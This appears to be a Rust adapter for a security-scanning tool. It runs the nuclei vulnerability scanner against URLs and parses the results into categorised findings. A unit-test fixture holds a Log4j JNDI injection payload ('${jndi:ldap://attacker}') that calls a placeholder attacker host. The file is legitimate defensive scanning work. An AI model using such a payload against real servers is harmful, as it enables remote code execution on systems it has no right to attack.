use anyhow::Result;
use async_trait::async_trait;
use serde::Deserialize;

use super::{Adapter, AdapterInput, RunContext};
use crate::finding::{Category, Finding, Severity};
use crate::util;

pub struct NucleiAdapter;

/// nuclei JSONL output structure (one JSON object per finding).
#[derive(Debug, Deserialize)]
#[allow(dead_code)]
struct NucleiResult {
    #[serde(default)]
    template_id: String,
    #[serde(default)]
    template_name: String,
    #[serde(default, rename = "type")]
    result_type: String,
    #[serde(default)]
    host: String,
    #[serde(default, rename = "matched")]
    matched_at: String,
    #[serde(default)]
    severity: String,
    #[serde(default)]
    name: String,
    #[serde(default)]
    description: String,
    #[serde(default)]
    extracted_results: Vec<String>,
    #[serde(default)]
    matcher_name: String,
    #[serde(default)]
    request: String,
    #[serde(default)]
    response: String,
    #[serde(default)]
    curl_command: String,
    #[serde(default)]
    ip: String,
    #[serde(default)]
    timestamp: String,
    #[serde(default)]
    #[serde(rename = "cwe")]
    cwe_id: String,
    #[serde(default)]
    #[serde(rename = "reference")]
    references: Vec<String>,
}

#[async_trait]
impl Adapter for NucleiAdapter {
    fn name(&self) -> &str {
        "nuclei"
    }

    fn check_available(&self) -> Result<bool> {
        Ok(util::command_exists("nuclei"))
    }

    fn version(&self) -> Result<String> {
        let output = util::run_command("nuclei", &["-version"])?;
        // nuclei prints version to stderr
        let ver = String::from_utf8_lossy(&output.stderr).trim().to_string();
        if ver.is_empty() {
            Ok(String::from_utf8_lossy(&output.stdout).trim().to_string())
        } else {
            Ok(ver)
        }
    }

    async fn run(&self, input: AdapterInput, ctx: &RunContext) -> Result<Vec<Finding>> {
        let urls = input.urls();
        if urls.is_empty() {
            return Ok(vec![]);
        }

        let config = &ctx.config.adapters.nuclei;

        let mut args: Vec<String> = vec![
            "-jsonl".into(),
            "-silent".into(),
            "-rate-limit".into(),
            config.rate_limit.to_string(),
        ];

        if !config.templates.is_empty() {
            args.push("-t".into());
            args.extend(config.templates.iter().cloned());
        }
        if !config.severity.is_empty() {
            args.push("-severity".into());
            args.push(config.severity.join(","));
        }

        // Add target URLs
        for url in &urls {
            args.push("-u".into());
            args.push(url.clone());
        }

        // Inject auth headers
        for (key, value) in &ctx.auth_headers {
            args.push("-H".into());
            args.push(format!("{key}: {value}"));
        }

        tracing::info!(adapter = "nuclei", count = urls.len(), "running nuclei");

        let output = util::run_and_capture(
            "nuclei",
            &args.iter().map(|s| s.as_str()).collect::<Vec<_>>(),
        )?;

        if !output.success && output.stdout_lines.is_empty() {
            tracing::warn!(
                adapter = "nuclei",
                stderr = %output.stderr,
                "nuclei exited with non-zero status"
            );
        }

        let findings = parse_nuclei_output(&output.stdout_lines, ctx.session_id);
        tracing::info!(
            adapter = "nuclei",
            findings = findings.len(),
            "nuclei completed"
        );

        Ok(findings)
    }
}

fn parse_nuclei_severity(s: &str) -> Severity {
    match s.to_lowercase().as_str() {
        "critical" => Severity::Critical,
        "high" => Severity::High,
        "medium" => Severity::Medium,
        "low" => Severity::Low,
        "info" | "informational" => Severity::Info,
        _ => Severity::Info,
    }
}

fn parse_nuclei_output(lines: &[String], session_id: uuid::Uuid) -> Vec<Finding> {
    lines
        .iter()
        .filter_map(|line| {
            let result: NucleiResult = match serde_json::from_str(line) {
                Ok(r) => r,
                Err(e) => {
                    tracing::debug!(line = %line, error = %e, "failed to parse nuclei JSONL line");
                    return None;
                }
            };

            let mut finding = Finding::new(session_id, "nuclei");
            finding.severity = parse_nuclei_severity(&result.severity);
            finding.category = category_from_template(&result.template_id);
            finding.url = if result.matched_at.is_empty() {
                result.host.clone()
            } else {
                result.matched_at
            };
            finding.title = if result.name.is_empty() {
                format!("[{}] {}", result.template_id, result.host)
            } else {
                result.name
            };
            finding.description = if result.description.is_empty() {
                result.template_name.clone()
            } else {
                result.description
            };

            if !result.cwe_id.is_empty() {
                finding.cwe = Some(result.cwe_id);
            }
            if !result.references.is_empty() {
                finding.reference = Some(result.references.join(", "));
            }
            if !result.extracted_results.is_empty() {
                finding.evidence = Some(result.extracted_results.join(", "));
            }

            Some(finding)
        })
        .collect()
}

fn category_from_template(template_id: &str) -> Category {
    let lower = template_id.to_lowercase();
    if lower.contains("sqli")
        || lower.contains("inject")
        || lower.contains("xss")
        || lower.contains("rce")
    {
        Category::Injection
    } else if lower.contains("auth") || lower.contains("login") || lower.contains("bypass") {
        Category::Auth
    } else if lower.contains("expos") || lower.contains("leak") || lower.contains("dump") {
        Category::DataExposure
    } else if lower.contains("misconfig") || lower.contains("config") {
        Category::Misconfig
    } else if lower.contains("cve") {
        Category::Injection // CVEs tend to be injection-ish, close enough for default
    } else {
        Category::Unknown
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn sample_nuclei_line() -> String {
        r#"{"template_id":"CVE-2021-44228","template_name":"Apache Log4j RCE","type":"http","host":"https://example.com","matched":"https://example.com/api","severity":"critical","name":"Apache Log4j RCE","description":"Remote code execution in Apache Log4j","extracted_results":["${jndi:ldap://attacker}"],"matcher_name":"jndi","ip":"1.2.3.4","timestamp":"2026-04-25T22:00:00Z","cwe":"CWE-502","reference":["https://nvd.nist.gov/vuln/detail/CVE-2021-44228"]}"#.to_string()
    }

    #[test]
    fn test_parse_nuclei_output() {
        let session_id = uuid::Uuid::new_v4();
        let lines = vec![sample_nuclei_line()];

        let findings = parse_nuclei_output(&lines, session_id);
        assert_eq!(findings.len(), 1);

        let f = &findings[0];
        assert_eq!(f.source, "nuclei");
        assert_eq!(f.severity, Severity::Critical);
        assert_eq!(f.category, Category::Injection);
        assert_eq!(f.url, "https://example.com/api");
        assert_eq!(f.title, "Apache Log4j RCE");
        assert_eq!(f.cwe, Some("CWE-502".to_string()));
        assert!(f.reference.is_some());
        assert_eq!(f.evidence, Some("${jndi:ldap://attacker}".to_string()));
    }

    #[test]
    fn test_parse_nuclei_multiple() {
        let session_id = uuid::Uuid::new_v4();
        let lines = vec![
            r#"{"template_id":"exposure-config","severity":"medium","host":"https://example.com","matched":"https://example.com/.env","name":"Exposed .env file"}"#.to_string(),
            r#"{"template_id":"misconfig-headers","severity":"info","host":"https://example.com","matched":"https://example.com","name":"Missing Security Headers"}"#.to_string(),
        ];

        let findings = parse_nuclei_output(&lines, session_id);
        assert_eq!(findings.len(), 2);
        assert_eq!(findings[0].severity, Severity::Medium);
        assert_eq!(findings[0].category, Category::DataExposure);
        assert_eq!(findings[1].severity, Severity::Info);
        assert_eq!(findings[1].category, Category::Misconfig);
    }

    #[test]
    fn test_parse_nuclei_empty() {
        let session_id = uuid::Uuid::new_v4();
        let findings = parse_nuclei_output(&[], session_id);
        assert!(findings.is_empty());
    }

    #[test]
    fn test_parse_nuclei_invalid_json() {
        let session_id = uuid::Uuid::new_v4();
        let lines = vec!["not json".to_string()];
        let findings = parse_nuclei_output(&lines, session_id);
        assert!(findings.is_empty());
    }

    #[test]
    fn test_parse_nuclei_severity() {
        assert_eq!(parse_nuclei_severity("critical"), Severity::Critical);
        assert_eq!(parse_nuclei_severity("HIGH"), Severity::High);
        assert_eq!(parse_nuclei_severity("Medium"), Severity::Medium);
        assert_eq!(parse_nuclei_severity("low"), Severity::Low);
        assert_eq!(parse_nuclei_severity("info"), Severity::Info);
        assert_eq!(parse_nuclei_severity("unknown"), Severity::Info);
    }
}
